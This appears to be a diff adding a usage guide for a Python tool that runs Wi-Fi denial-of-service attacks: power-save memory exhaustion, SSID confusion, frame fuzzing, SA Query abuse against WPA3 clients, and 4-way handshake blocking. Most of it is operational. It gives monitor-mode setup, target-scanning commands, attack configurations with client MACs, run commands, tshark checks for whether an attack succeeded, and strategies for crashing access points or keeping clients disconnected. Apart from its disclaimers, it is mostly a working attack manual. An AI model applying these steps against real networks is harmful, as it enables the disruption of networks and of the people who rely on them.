@@ -1,0 +1,583 @@
+# USAGE GUIDE: orchestator_Moderne_Angriffe_2023-_en.py
+
+**DISCLAIMER:** This script is intended for EDUCATIONAL PURPOSES ONLY and for authorized security testing on networks you own or have explicit permission to test. Unauthorized use is illegal.
+
+## OVERVIEW
+This script contains cutting-edge attacks discovered in 2023+ research, including SSID confusion exploits, power-save exhaustion, buffer overflow fuzzing, SA Query abuse, and handshake blocking. These are the most advanced attacks available.
+
+---
+
+## PREREQUISITES
+
+### Required Hardware
+- Multiple Wi-Fi adapters with monitor mode and injection support
+- **Scanner adapter MANDATORY for ssid_confusion attack**
+- Recommended: 2-4 adapters for multi-attack scenarios
+
+### Required Software
+- Linux OS (Kali Linux recommended)
+- Python 3.x
+- Scapy: `pip3 install scapy`
+- Aircrack-ng suite: `apt-get install aircrack-ng`
+- Wireshark: `apt-get install wireshark` (for verification)
+- tshark: `apt-get install tshark` (for monitoring)
+
+---
+
+## STEP-BY-STEP USAGE INSTRUCTIONS
+
+### STEP 1: SET ADAPTERS TO MONITOR MODE
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airmon-ng start wlan1
+sudo airmon-ng start wlan2
+sudo airmon-ng start wlan3
+```
+
+Verify monitor mode:
+```bash
+iwconfig
+```
+All interfaces should show "Mode:Monitor"
+
+---
+
+### STEP 2: SCAN FOR TARGET NETWORKS
+
+**For most attacks:**
+```bash
+sudo airodump-ng wlan0mon --band abg
+```
+
+**For SSID_CONFUSION attack (requires TWO networks):**
+You need to identify:
+- Main network (secure, e.g., "HomeNetwork")
+- Guest network (less secure, e.g., "HomeNetwork-Guest")
+- **Both networks MUST have DIFFERENT SSIDs**
+- Note BSSIDs and channels for BOTH networks
+
+Record:
+- Main network BSSID (5 GHz): `TARGET_BSSID_5GHZ`
+- Main network BSSID (2.4 GHz): `TARGET_BSSID_2_4GHZ`
+- Guest network BSSID: `TARGET_BSSID_GASTNETZ`
+- All channels
+- Connected client MAC addresses
+
+Press `Ctrl+C` when done.
+
+---
+
+### STEP 3: IDENTIFY CONNECTED CLIENTS
+
+**Critical for most attacks in this script:**
+
+Continue monitoring:
+```bash
+sudo airodump-ng wlan0mon --bssid 64:67:72:81:9C:6E -c 36
+```
+
+Look at the "STATION" section (bottom half):
+- These are client MAC addresses
+- Note which are connected to your target networks
+- You need at least 1-2 client MACs
+
+---
+
+### STEP 4: CONFIGURE THE SCRIPT
+
+Open the script:
+```bash
+nano orchestator_Moderne_Angriffe_2023-_en.py
+```
+
+#### 4.1: Set Target BSSIDs
+
+**Main Network:**
+```python
+TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"      # Main network 5 GHz
+TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"    # Main network 2.4 GHz
+```
+
+**Guest Network (ONLY for ssid_confusion):**
+```python
+TARGET_BSSID_GASTNETZ = "82:67:72:81:9C:6F"  # Guest network BSSID
+```
+
+#### 4.2: Configure Scanner
+
+**IMPORTANT:** ssid_confusion attack REQUIRES active scanner!
+
+```python
+SCANNER_INTERFACE = "wlan1mon"  # Mandatory for ssid_confusion
+```
+
+#### 4.3: Set Manual Channels (for non-ssid_confusion attacks)
+
+```python
+MANUELLER_KANAL_5GHZ = "52"         # Main 5 GHz channel
+MANUELLER_KANAL_2_4GHZ = "7"        # Main 2.4 GHz channel
+MANUELLER_KANAL_GASTNETZ = "7"      # Guest network channel
+```
+
+#### 4.4: Define Target Clients
+
+**Critical - most attacks require this:**
+
+```python
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09",  # Client connected to MAIN network
+    "B2:5D:F9:73:10:6C",  # Another client on MAIN network
+    "6E:8F:9F:B4:3D:10"
+]
+```
+
+#### 4.5: Configure Attack Adapters
+
+**Available attack types:**
+- `power_save_exhaustion`: RAM overflow via power-save abuse
+- `ssid_confusion`: Multi-SSID security logic confusion
+- `buffer_overflow_fuzzer`: Fuzzing for zero-day vulnerabilities
+- `sa_query_abuse`: PMF SA Query timeout exploit
+- `handshake_block`: 4-Way Handshake prevention
+
+**Example Configuration:**
+
+**For power_save_exhaustion:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan2mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan3mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "power_save_exhaustion"}
+}
+```
+
+**For ssid_confusion:**
+```python
+SCANNER_INTERFACE = "wlan0mon"  # MANDATORY!
+ADAPTER_KONFIGURATION = {
+    "wlan3mon": {"band": "2.4GHz", "angriff": "ssid_confusion"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "ssid_confusion"}
+}
+```
+
+**For sa_query_abuse:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan2mon": {"band": "5GHz", "angriff": "sa_query_abuse"},
+    "wlan3mon": {"band": "5GHz", "angriff": "sa_query_abuse"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]  # Required
+```
+
+**For handshake_block:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan3mon": {"band": "2.4GHz", "angriff": "handshake_block"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "handshake_block"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]  # Required
+```
+
+---
+
+### STEP 5: RUN THE SCRIPT
+
+Execute the attack:
+```bash
+sudo python3 orchestator_Moderne_Angriffe_2023-_en.py
+```
+
+**Script behavior:**
+1. Validates configuration
+2. Starts scanner (if enabled)
+3. For ssid_confusion: validates multi-SSID setup
+4. Launches attack processes
+5. Displays real-time status
+
+**To stop:** Press `Ctrl+C`
+
+---
+
+## ATTACK-SPECIFIC DETAILS
+
+### POWER_SAVE_EXHAUSTION
+
+**How it works:**
+- Exploits Power-Save buffering mechanism
+- Sends frames from hundreds of fake MACs marked as "sleeping"
+- AP buffers all traffic for these "sleeping" clients
+- RAM fills up until AP crashes or becomes unresponsive
+
+**Analogy:** Like telling a post office to hold packages for 1000 fake people
+
+**Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan2mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "power_save_exhaustion"}
+}
+```
+
+**Success verification:**
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E" -T fields -e frame.time_delta_displayed
+```
+**Success:** Beacon intervals >> 0.1024 (e.g., 1.0+)
+
+**Best practices:**
+- Use 2-4 adapters simultaneously
+- Works on both WPA2 and WPA3
+- Extremely effective on routers with limited RAM
+
+---
+
+### SSID_CONFUSION
+
+**How it works:**
+- Exploits routers with multiple SSIDs (main + guest network)
+- Spoofs client MAC from secure network
+- Sends authentication to insecure guest network
+- Router's security logic gets confused
+- Drops packets or bypasses security protocols
+
+**Analogy:** VIP guest shows up at wrong party entrance, confusing the bouncer
+
+**CRITICAL REQUIREMENTS:**
+1. Router must have TWO different SSIDs
+2. Scanner MUST be active
+3. Different security levels preferred (e.g., WPA3 main, WPA2 guest)
+
+**Configuration:**
+```python
+TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"       # Main network
+TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"     # Main network
+TARGET_BSSID_GASTNETZ = "82:67:72:81:9C:6F"   # Guest network (DIFFERENT SSID!)
+
+SCANNER_INTERFACE = "wlan0mon"  # MANDATORY
+
+ADAPTER_KONFIGURATION = {
+    "wlan3mon": {"band": "2.4GHz", "angriff": "ssid_confusion"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "ssid_confusion"}
+}
+
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09"  # Client on MAIN network
+]
+```
+
+**Success verification:**
+Monitor both networks for disruption. Clients may disconnect or experience severe packet loss.
+
+**Common issues:**
+- Script exits if SSIDs are identical
+- Both networks must be discoverable
+- Scanner must detect both BSSIDs
+
+---
+
+### BUFFER_OVERFLOW_FUZZER
+
+**How it works:**
+- Sends intentionally malformed/oversized Wi-Fi frames
+- Attempts to trigger buffer overflows in AP firmware
+- Three fuzzing methods:
+  1. Oversized SSID (255 bytes)
+  2. Excessive vendor-specific elements
+  3. Malformed RSN info
+
+**Analogy:** Sending nonsensical commands hoping to crash the system
+
+**Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan2mon": {"band": "5GHz", "angriff": "buffer_overflow_fuzzer"},
+    "wlan3mon": {"band": "5GHz", "angriff": "buffer_overflow_fuzzer"}
+}
+```
+
+**Success verification:**
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E"
+```
+**Success:** AP stops sending beacons or becomes unresponsive
+
+**Important notes:**
+- This is a "fuzzing" attack - success not guaranteed
+- May discover unknown vulnerabilities (zero-days)
+- Different routers react differently
+- Be patient - may take time to trigger crash
+
+---
+
+### SA_QUERY_ABUSE
+
+**How it works:**
+- Exploits PMF (Protected Management Frames) mechanism
+- Sends association with Power-Save bit set
+- AP marks client as "sleeping"
+- Legitimate client can't communicate (packets buffered)
+- Client's SA Query requests timeout
+- **Client disconnects itself**
+
+**This is the most reliable way to disconnect WPA3 clients!**
+
+**Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan2mon": {"band": "5GHz", "angriff": "sa_query_abuse"},
+    "wlan3mon": {"band": "5GHz", "angriff": "sa_query_abuse"}
+}
+
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09",  # High-value WPA3 client
+    "6A:6B:18:3C:91:4F"
+]
+```
+
+**Success verification:**
+```bash
+sudo tshark -i wlan0mon -Y "wlan.addr == 30:34:DB:11:48:09 && wlan.fc.type_subtype == 0x0c"
+```
+
+**Success indicators:**
+- Deauth frame where SOURCE = client MAC (client kicked itself!)
+- Client repeatedly fails to reconnect
+- Takes ~10-30 seconds to trigger
+
+**Verification methods:**
+```bash
+# Method 1: Watch for self-deauth
+sudo tshark -i wlan3mon -Y "(wlan.addr == 6A:6B:18:3C:91:4F) && (eapol || wlan.fc.type_subtype == 0x0c)"
+
+# Method 2: Monitor all activity
+sudo tshark -i wlan2mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0c)"
+```
+
+---
+
+### HANDSHAKE_BLOCK
+
+**How it works:**
+- Prevents 4-Way Handshake completion
+- Step 1: Deauth client (force reconnection attempt)
+- Step 2: Send Power-Save frames to block handshake
+- Client can associate but never complete authentication
+- After timeout, client gives up and disconnects
+
+**Perfect companion to deauth attacks!**
+
+**Configuration:**
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan3mon": {"band": "2.4GHz", "angriff": "handshake_block"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "handshake_block"}
+}
+
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]  # Required
+```
+
+**Success verification:**
+```bash
+sudo tshark -i wlan4mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
+```
+
+**Success indicators:**
+- Client sends Association Request (0x0a)
+- **NO EAPOL packets appear** (handshake blocked)
+- After 10-15 seconds: client sends Deauthentication (0x0c)
+- Client cannot connect despite trying repeatedly
+
+**Best use case:**
+Combine with deauth_flood from another script to keep client in reconnection loop.
+
+---
+
+## ATTACK STRATEGIES
+
+### Strategy 1: Maximum RAM Exhaustion
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan2mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan3mon": {"band": "5GHz", "angriff": "power_save_exhaustion"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "power_save_exhaustion"}
+}
+```
+**Goal:** Complete AP crash via memory overflow
+
+### Strategy 2: WPA3 Client Targeting
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan2mon": {"band": "5GHz", "angriff": "sa_query_abuse"},
+    "wlan3mon": {"band": "5GHz", "angriff": "sa_query_abuse"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]
+```
+**Goal:** Reliable WPA3 client disconnection via PMF exploit
+
+### Strategy 3: Connection Prevention
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "2.4GHz", "angriff": "handshake_block"},
+    "wlan2mon": {"band": "2.4GHz", "angriff": "handshake_block"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09", "B2:5D:F9:73:10:6C"]
+```
+**Goal:** Prevent any clients from connecting/reconnecting
+
+### Strategy 4: Multi-SSID Exploitation
+```python
+SCANNER_INTERFACE = "wlan0mon"
+ADAPTER_KONFIGURATION = {
+    "wlan3mon": {"band": "2.4GHz", "angriff": "ssid_confusion"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "ssid_confusion"}
+}
+TARGET_STA_MACS = ["30:34:DB:11:48:09"]
+```
+**Goal:** Exploit security logic in multi-SSID routers
+
+### Strategy 5: Zero-Day Hunting
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "buffer_overflow_fuzzer"},
+    "wlan2mon": {"band": "5GHz", "angriff": "buffer_overflow_fuzzer"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "buffer_overflow_fuzzer"}
+}
+```
+**Goal:** Trigger unknown firmware vulnerabilities
+
+---
+
+## TROUBLESHOOTING
+
+### SSID_CONFUSION specific errors
+
+**"ssid_confusion attack aborted: No valid Multi-SSID setup found"**
+- Ensure both main and guest networks are visible
+- Verify SSIDs are DIFFERENT
+- Check scanner is active: `SCANNER_INTERFACE = "wlan0mon"`
+- Increase scan time if needed
+
+**"Attack requires TARGET_STA_MACS"**
+- Most attacks need client MACs
+- Use airodump-ng to find connected clients
+- Add to TARGET_STA_MACS array
+
+### SA_QUERY_ABUSE not working
+- Verify clients have PMF enabled (WPA3 clients)
+- Ensure clients are actively connected
+- May take 10-30 seconds to trigger disconnect
+- Check client MAC is correct
+
+### HANDSHAKE_BLOCK not preventing connections
+- Verify clients are attempting reconnection
+- May need to manually deauth clients first
+- Check TARGET_STA_MACS is populated
+- Ensure adapter is on correct channel
+
+### POWER_SAVE_EXHAUSTION no effect
+- Some routers have large RAM buffers
+- Use more adapters (3-4 recommended)
+- Monitor beacon jitter - should show gradual increase
+- May take 1-2 minutes to reach critical point
+
+### BUFFER_OVERFLOW_FUZZER shows no results
+- This is normal - fuzzing doesn't always trigger crashes
+- Try running for extended periods (5-10 minutes)
+- Different firmware versions respond differently
+- Not all routers have exploitable vulnerabilities
+
+---
+
+## VERIFICATION COMMANDS REFERENCE
+
+**Beacon Jitter (AP overload):**
+```bash
+sudo tshark -i wlan7mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == D4:86:60:A3:F9:6F" -T fields -e frame.time_delta_displayed
+```
+
+**Client Self-Deauth (SA Query):**
+```bash
+sudo tshark -i wlan7mon -Y "(wlan.addr == 6A:6B:18:3C:91:4F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0c)"
+```
+
+**Handshake Blocking:**
+```bash
+sudo tshark -i wlan4mon -Y "(wlan.addr == 56:14:9A:6D:10:2F || wlan.addr == 16:08:57:DB:66:80) && (eapol || wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c)"
+```
+
+**Multi-Client Monitoring:**
+```bash
+sudo tshark -i wlan4mon -Y "(wlan.addr == 56:14:9A:6D:10:2F or wlan.addr == 16:08:57:DB:66:80 or wlan.addr == 7C:0A:3F:6E:A1:58 or wlan.addr == 82:49:2C:43:16:81) and (eapol or wlan.fc.type_subtype == 0x0a or wlan.fc.type_subtype == 0x0c)"
+```
+
+---
+
+## STARTING THE SCRIPT
+
+**Standard execution:**
+```bash
+sudo python3 orchestator_Moderne_Angriffe_2023-_en.py
+```
+
+**With output logging:**
+```bash
+sudo python3 orchestator_Moderne_Angriffe_2023-_en.py 2>&1 | tee modern_attacks_log.txt
+```
+
+**Background execution:**
+```bash
+sudo screen -S modern_attacks
+sudo python3 orchestator_Moderne_Angriffe_2023-_en.py
+# Detach: Ctrl+A, then D
+# Reattach: sudo screen -r modern_attacks
+```
+
+---
+
+## IMPORTANT NOTES
+
+1. **SSID_CONFUSION requires scanner:** Cannot use manual channels
+2. **SA_QUERY_ABUSE timing:** Takes 10-30 seconds to trigger
+3. **Client MACs required:** Most attacks need TARGET_STA_MACS
+4. **Fuzzing patience:** buffer_overflow_fuzzer may need extended runtime
+5. **WPA3 focus:** These attacks are optimized for modern WPA3 networks
+
+---
+
+## LEGAL DISCLAIMER
+
+**FOR EDUCATIONAL PURPOSES ONLY**
+
+- Only test on networks you own or have explicit written authorization
+- Unauthorized wireless attacks are federal crimes in most jurisdictions
+- Penalties include imprisonment and substantial fines
+- This tool is for authorized security research and penetration testing ONLY
+- Author assumes NO LIABILITY for misuse or illegal activities
+
+**Use responsibly. You are solely accountable for your actions.**
+
+---
+
+## REFERENCES
+
+Based on cutting-edge research (2023+):
+- Modern Power-Save exploitation techniques
+- SSID confusion vulnerabilities in multi-SSID implementations
+- PMF SA Query timeout abuse
+- 4-Way Handshake blocking mechanisms
+- Firmware fuzzing methodologies
+
+## SUMMARY
+
+This script contains the **newest and most advanced attacks**:
+- **Power-Save Exhaustion:** RAM overflow via buffering abuse
+- **SSID Confusion:** Multi-SSID security logic exploitation
+- **Buffer Overflow Fuzzer:** Zero-day hunting via malformed frames
+- **SA Query Abuse:** Most reliable WPA3 client disconnection method
+- **Handshake Block:** Connection prevention via handshake disruption
+
+Use when targeting modern WPA3 networks or researching cutting-edge vulnerabilities.
